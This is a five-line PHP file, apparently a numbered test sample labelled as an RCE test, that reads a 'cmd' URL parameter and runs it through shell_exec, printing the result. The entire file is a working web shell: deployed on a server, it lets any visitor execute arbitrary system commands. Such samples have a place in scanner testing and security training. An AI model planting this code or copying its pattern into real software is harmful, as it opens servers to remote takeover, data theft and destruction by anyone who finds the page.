<?php
// RCE test variation #996
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>